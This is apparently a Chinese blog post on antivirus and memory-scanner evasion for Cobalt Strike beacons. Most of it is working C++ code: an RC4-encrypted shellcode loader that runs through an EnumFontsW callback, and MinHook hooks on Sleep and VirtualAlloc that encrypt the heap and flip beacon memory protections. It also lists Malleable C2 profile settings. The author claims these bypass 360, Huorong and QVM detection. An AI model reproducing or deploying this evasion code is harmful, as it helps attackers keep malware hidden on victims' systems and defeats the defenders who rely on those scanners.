<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include&quot;resource.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">#define size_b 256</span><br><span class="line">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化s表</span><br><span class="line">void init_sbox(unsigned char* key) &#123;</span><br><span class="line">    unsigned int i, j, k;</span><br><span class="line">    int tmp;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        sbox[i] &#x3D; i;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        tmp &#x3D; sbox[i];</span><br><span class="line">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class="line">        sbox[i] &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; tmp;</span><br><span class="line">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加解密函数</span><br><span class="line">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class="line">    int i, j, k, R, tmp;</span><br><span class="line">    init_sbox(key);</span><br><span class="line"></span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class="line">        j &#x3D; (j + 1) % size_b;</span><br><span class="line">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class="line"></span><br><span class="line">        tmp &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; sbox[k];</span><br><span class="line">        sbox[k] &#x3D; tmp;</span><br><span class="line"></span><br><span class="line">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class="line"></span><br><span class="line">        data[i] ^&#x3D; R;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class="line">        return character - &#39;0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class="line">        return character - &#39;a&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class="line">        return character - &#39;A&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hexToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class="line">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    HRSRC Png &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_MYRES1), &quot;MYRES&quot;);</span><br><span class="line">    HGLOBAL LoadPng &#x3D; LoadResource(NULL, Png);</span><br><span class="line">    DWORD PngSize &#x3D; SizeofResource(NULL, Png);</span><br><span class="line">    LPVOID PngData &#x3D; LockResource(LoadPng);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    const size_t length &#x3D; PngSize &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class="line">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    char* charPtr &#x3D; reinterpret_cast&lt;char*&gt;(PngData);</span><br><span class="line">    hexToBytes((string)charPtr, mypng, length);</span><br><span class="line">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class="line">    enc_dec(key, mypng);</span><br><span class="line">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104803245.png" alt="image-20240507104803245"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>总的来说，目前为止学会上面的 shellcode加载、shellcode加密、分离免杀后，搭配下面的 杂项 内容，基本动静态绕过360/火绒已经基本不是问题了。绕过QVM的主要方法就是添加资源、添加资源、还是TM的添加资源，尽量不要让程序太小，之前没有添加资源的时候编译出来200kb左右，很难直接免杀。火绒直接用远程拉取就行。</p>
<h1 id="内存动态免杀"><a href="#内存动态免杀" class="headerlink" title="内存动态免杀"></a>内存动态免杀</h1><p><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/avoiding-memory-scanners/">Avoiding Memory Scanners</a>，文章提出三种扫描检测方向：</p>
<ol>
<li>利用yara在内存中匹配cobalt strike相关字符串/字节</li>
<li>内存页面属性</li>
<li>堆栈跟踪</li>
</ol>
<p>给出了几种bypass方向</p>
<ol>
<li>动态堆加/解密</li>
<li>避免睡眠</li>
<li>属性修改</li>
<li>堆栈欺骗</li>
</ol>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>要在内存中免杀，首先要知道cs在内存中是怎么活动的或者说知道cs的 beacon 从生成到上线再到执行的整个流程。</p>
<p>文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzkxMTMxMjI2OQ==&scene=23&album_id=2280727834220429320">CobaltStrike逆向学习系列</a>    <a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao">Cobalt Strike原理介绍</a>   <a target="_blank" rel="noopener" href="https://tttang.com/archive/1631/">CobaltStrike Beacon生成原理分析</a>  <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2017">Cobaltstrike4.0 shellcode分析</a></p>
<p>从流程中总结出内存特征</p>
<p>文章：<a target="_blank" rel="noopener" href="https://blog.nsfocus.net/beaconeye-cs/">从BeaconEye说起，围绕CS内存特征的检测与规避</a>     <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_gSPWVb1b-xuvhU6ynmw0Q">如何正确的 “手撕” Cobalt Strike</a></p>
<p>最后根据特征bypass。</p>
<h2 id="动态堆加-解密"><a href="#动态堆加-解密" class="headerlink" title="动态堆加/解密"></a>动态堆加/解密</h2><h3 id="minhook"><a href="#minhook" class="headerlink" title="minhook"></a>minhook</h3><p>一个用于hook winapi的稳定库，下载Releases中的lib.zip，<a target="_blank" rel="noopener" href="https://github.com/TsudaKageyu/minhook">TsudaKageyu/minhook: The Minimalistic x86/x64 API Hooking Library for Windows</a></p>
<p>项目中新建include、libs文件夹，如下结构</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093423537.png" alt="image-20240508093423537"></p>
<p>并添加目录进行引用</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093253085.png" alt="image-20240508093253085"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093345168.png" alt="image-20240508093345168"></p>
<p>测试</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093500489.png" alt="image-20240508093500489"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>hook Sleep()</li>
<li>运行shellcode上线</li>
<li>触发MyHookedSleep()</li>
<li>挂起进程</li>
<li>加密当前线程的所有堆空间</li>
<li>Sleep()</li>
<li>解密当前线程的所有堆空间</li>
<li>恢复进程</li>
</ol>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>直接给出代码，Ref：<a target="_blank" rel="noopener" href="https://github.com/waldo-irc/LockdExeDemo">waldo-irc/LockdExeDemo</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;MinHook.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">#include &quot;Thread.h&quot;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">#if defined _M_X64</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class="line">#elif defined _M_IX86</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class="line">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class="line">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class="line">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class="line">&#123;</span><br><span class="line">    return MH_CreateHookApi(</span><br><span class="line">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL Hook()</span><br><span class="line">&#123;</span><br><span class="line">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------encrypt heap--------------------------------------*&#x2F;</span><br><span class="line">const char key[9] &#x3D; &quot;Aoliao66&quot;;  &#x2F;&#x2F; Encryption Key</span><br><span class="line">size_t keySize &#x3D; sizeof(key);</span><br><span class="line"></span><br><span class="line">void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) &#123;</span><br><span class="line">    for (size_t i &#x3D; 0; i &lt; length; ++i) &#123;</span><br><span class="line">        buffer[i] ^&#x3D; key[i % keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESS_HEAP_ENTRY entry;</span><br><span class="line">void HeapEncryptDecrypt() &#123;</span><br><span class="line">    SecureZeroMemory(&amp;entry, sizeof(entry));</span><br><span class="line">    while (HeapWalk(GetProcessHeap(), &amp;entry)) &#123;</span><br><span class="line">        if ((entry.wFlags &amp; PROCESS_HEAP_ENTRY_BUSY) !&#x3D; 0) &#123;</span><br><span class="line">            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------my hook-sleep func--------------------------------*&#x2F;</span><br><span class="line">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD time &#x3D; dwMiliseconds;</span><br><span class="line">    if (time &gt; 1000) &#123;</span><br><span class="line">        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">        HeapEncryptDecrypt();</span><br><span class="line"></span><br><span class="line">        OldSleep(dwMiliseconds);</span><br><span class="line"></span><br><span class="line">        HeapEncryptDecrypt();</span><br><span class="line">        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        OldSleep(time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (!Hook()) &#123; return 1; &#125;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;\xfc\x48\x83\xe4\xf0...&quot;;  &#x2F;&#x2F; shellcode is here</span><br><span class="line">    const size_t length &#x3D; sizeof(buf);</span><br><span class="line">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(mypng, buf, length);</span><br><span class="line">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译好的BeaconEye：<a target="_blank" rel="noopener" href="https://github.com/yongsheng220/beaconeye">beaconeye</a>，BeaconEye直接扫到</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508130409497.png" alt="image-20240508130409497"></p>
<p>处理后</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508144113176.png" alt="image-20240508144113176"></p>
<p>Ref：<a target="_blank" rel="noopener" href="https://www.arashparsa.com/hook-heaps-and-live-free/">Hook Heaps and Live Free</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vrGQ2L-XpMgRqjJxKQhuZQ">安全开发之堆分配内存加密</a> 、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kJzyjYvWMWoHJJ8LIwodVQ">【免杀】初探卡巴–堆加密</a> </p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>这种方式的缺陷或者说比较丑陋的一点是将当前线程挂起，将当前进程所有heap加密，如果现在有注入到其他进程的需求，缺陷就体现的淋漓尽致，会导致宿主进程因为挂起而不稳定甚至崩溃。</p>
<h2 id="属性修改"><a href="#属性修改" class="headerlink" title="属性修改"></a>属性修改</h2><p>通过hook sleep后将恶意代码所在内存的属性修改为RW。</p>
<h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>实现堆加密的目的就是要掩盖恶意代码在内存中的特征，如何在heap中精准定位shellcode？回顾beacon的加载流程为三步</p>
<ol>
<li>shellcode(stager)从c2拉取stage(加密beacon.dll)</li>
<li>开辟新空间，解密stage(beacon.dll)出反射DLL，并调用reflectiveloader</li>
<li>开辟新空间，将解密的beacon.dll复制到新空间，调用dllmain</li>
</ol>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508225544787.png" alt="image-20240508225544787"></p>
<p>这里就能提出两个问题：</p>
<p>一、三步中都开辟了新空间，可以hook对应开辟空间的函数从而精准获得恶意代码内存地址，那么应该hook哪个函数？</p>
<p>二、能否扫描出heap空间特殊的内存属性？因为开辟的空间一定存在的特征是私有提交(private commit)、可执行(X)的属性</p>
<p>只要解决这两个问题就是两个不同的精准找内存的方法。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这里简单说下两个问题的解决方法。</p>
<p>一：stage开辟空间的函数收到c2 profile的影响，profile中的stage规定了allocator的参数作为内存分配的函数，有三个 <code>VirtualAlloc</code> <code>HeapAlloc</code> <code>MapViewOfFile</code> 默认为 VirtualAlloc。所以我们只要hook这三个函数之一，最少可以得到两个地址，然后同时hook Sleep对这两个地址利用 <code>VirtualProtect</code> 修改内存属性。</p>
<p>hook VirtualAlloc 代码示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class="line">&#123;</span><br><span class="line">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">    printf(&quot;address &#x3D; 0X%p\n&quot;, address);</span><br><span class="line">    return address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hook后第一个地址为自己开辟内存执行shellcode的内存地址(RWX)</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509152718366.png" alt="image-20240509152718366"></p>
<p>二：遍历扫描内存页，标记特殊属性的页面地址，然后hook Sleep进行翻转属性。这是我所能找到的文章普遍采用的方法</p>
<p>直接贴两个文章：<a target="_blank" rel="noopener" href="https://maidang.cool/2022/26991.html#Stager">翻转cs beacon属性页</a>、<a target="_blank" rel="noopener" href="https://forum.butian.net/share/2620">一次cs样本免杀实践</a></p>
<h3 id="Malleable-PE-Stage"><a href="#Malleable-PE-Stage" class="headerlink" title="Malleable PE/Stage"></a>Malleable PE/Stage</h3><p>首先要介绍profile中的配置，你可以在profile中stage标签实现beacon的元数据修改、在内存中的属性、数据的替换、加解密混淆等。</p>
<ul>
<li><p>sleep_mask： 设置为true时，会对数据和代码进行异或加密，3.11版本是单字节异或，4.2版本是13字节异或</p>
</li>
<li><p>userwx：设置执行反射dll所分配的内存属性，true为RWX，false为RX</p>
</li>
<li><p>cleanup：设置true后，会抹去存放在内存中的反射DLL，false则不会</p>
</li>
<li><p>stomppe：设置为true时能对MZ、PE和e_lfanew的值进行混淆</p>
</li>
<li><p>obfuscate：设置为true时，能混淆dll的导入表、区段名等信息，使得根据导入表匹配的规则失效</p>
</li>
</ul>
<p>这里我的设置为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set userwx          &quot;true&quot;;</span><br><span class="line">set cleanup         &quot;false&quot;;</span><br><span class="line">set sleep_mask      &quot;false&quot;;</span><br><span class="line">set stomppe         &quot;false&quot;;</span><br><span class="line">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>

<p>hook VirtualAlloc，x86上线（当x64 hook三个函数时，会造成内部死锁 <a target="_blank" rel="noopener" href="https://github.com/TsudaKageyu/minhook/issues/99%EF%BC%89%EF%BC%8Cbeacon%E5%B1%9E%E6%80%A7%E4%B8%BARWX%E4%B8%80%E6%95%B4%E5%9D%97%E5%9C%B0%E5%9D%80%E3%80%82">https://github.com/TsudaKageyu/minhook/issues/99），beacon属性为RWX一整块地址。</a></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181004796.png" alt="image-20240509181004796"></p>
<p>再看内存，确实都是beacon的准确地址</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181502568.png" alt="image-20240509181502568"></p>
<p>再将配置改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set userwx          &quot;false&quot;;</span><br><span class="line">set cleanup         &quot;false&quot;;</span><br><span class="line">set sleep_mask      &quot;false&quot;;</span><br><span class="line">set stomppe         &quot;false&quot;;</span><br><span class="line">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>

<p>hook VirtualAlloc，x86上线，beacon属性分为RW+RX三部分地址。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224506184.png" alt="image-20240510224506184"></p>
<p>内存情况</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224646554.png" alt="image-20240510224646554"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set userwx          &quot;false&quot;;</span><br><span class="line">set cleanup         &quot;false&quot;;</span><br><span class="line">set sleep_mask      &quot;true&quot;;</span><br><span class="line">set stomppe         &quot;false&quot;;</span><br><span class="line">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>

<p>sleep_mask开启，hook VirtualAlloc，x86上线，heap内存被动态加密。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234307048.png" alt="image-20240510234307048"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234321484.png" alt="image-20240510234321484"></p>
<p>个人使用如下配置进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set userwx          &quot;false&quot;;</span><br><span class="line">set cleanup         &quot;false&quot;;</span><br><span class="line">set sleep_mask      &quot;false&quot;;</span><br><span class="line">set stomppe         &quot;false&quot;;</span><br><span class="line">set obfuscate       &quot;false&quot;;</span><br><span class="line">set rich_header     &quot;&quot;;</span><br><span class="line">set smartinject 	&quot;true&quot;;</span><br><span class="line">set allocator 		&quot;VirtualAlloc&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>以编译时x86为例，实战x64环境可以兼容运行x86。hook VirtualAlloc后只留下真正beacon的内存并修改其属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;MinHook.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#if defined _M_X64</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class="line">#elif defined _M_IX86</span><br><span class="line">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class="line">struct MemoryAttrib &#123;</span><br><span class="line">    LPVOID address;		&#x2F;&#x2F; 内存地址</span><br><span class="line">    DWORD size;			&#x2F;&#x2F; 内存大小</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class="line">struct MemoryInfo &#123;</span><br><span class="line">    MemoryAttrib memoryPage[3];		&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class="line">    int index &#x3D; 0;					&#x2F;&#x2F; 内存下标</span><br><span class="line">    BOOL iscleaned &#x3D; FALSE;			&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MemoryInfo memoryInfo;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class="line">void DeleteOther()</span><br><span class="line">&#123;</span><br><span class="line">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[0];</span><br><span class="line">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[1];</span><br><span class="line">    printf(&quot;[+]shellcode Address at 0x%p\n&quot;, shellcode.address);</span><br><span class="line">    printf(&quot;[+]enc_beacon Address at 0x%p\n&quot;, enc_beacon.address);</span><br><span class="line">    &#x2F;&#x2F; 将内存使用0填充</span><br><span class="line">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class="line">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class="line">    DWORD oldProt;</span><br><span class="line">    &#x2F;&#x2F;修改属性</span><br><span class="line">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class="line">LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class="line">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class="line"></span><br><span class="line">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class="line">LPVOID(WINAPI MyHookedVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class="line">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class="line">&#123;</span><br><span class="line">    return MH_CreateHookApi(</span><br><span class="line">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL Hook()</span><br><span class="line">&#123;</span><br><span class="line">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    &#x2F;&#x2F; hook VirtualAlloc</span><br><span class="line">    if (MH_CreateHookApiEx(L&quot;Kernel32.dll&quot;, &quot;VirtualAlloc&quot;, &amp;MyHookedVirtualAlloc, &amp;OldVirtualAlloc) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    &#x2F;&#x2F; hook Sleep</span><br><span class="line">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line"></span><br><span class="line">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class="line">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 1. shellcode 2. enc-beacon 3. beacon</span><br><span class="line">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">    printf(&quot;[+]VirtualAlloc: Reserved %d at address 0x%p\n&quot;, dwSize, address);</span><br><span class="line">    memoryInfo.memoryPage[memoryInfo.index].address &#x3D; address;</span><br><span class="line">    memoryInfo.memoryPage[memoryInfo.index].size &#x3D; (DWORD)dwSize;</span><br><span class="line">    memoryInfo.index++;</span><br><span class="line">    return address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD oldProt;</span><br><span class="line">    if (!memoryInfo.iscleaned) &#123;</span><br><span class="line">        DeleteOther();</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD time &#x3D; dwMiliseconds;</span><br><span class="line">    if (time &gt; 1000) &#123;</span><br><span class="line">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class="line">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_READWRITE, &amp;oldProt);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class="line">        OldSleep(dwMiliseconds);</span><br><span class="line"></span><br><span class="line">        printf(&quot;[+]修改beacon属性为RWX: address 0x%p\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class="line">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_EXECUTE_READWRITE, &amp;oldProt);</span><br><span class="line">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class="line">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        OldSleep(time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (!Hook()) &#123;return 1; &#125;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;\xfc\xe8\x89\x00\x00\x00...&quot;;</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; sizeof(buf);</span><br><span class="line">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(shellcode, buf, length);</span><br><span class="line">    ((void(*)(void)) shellcode)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果图：这里直接修改内存为RWX。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515013927782.png" alt="image-20240515013927782"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515014050590.png" alt="image-20240515014050590"></p>
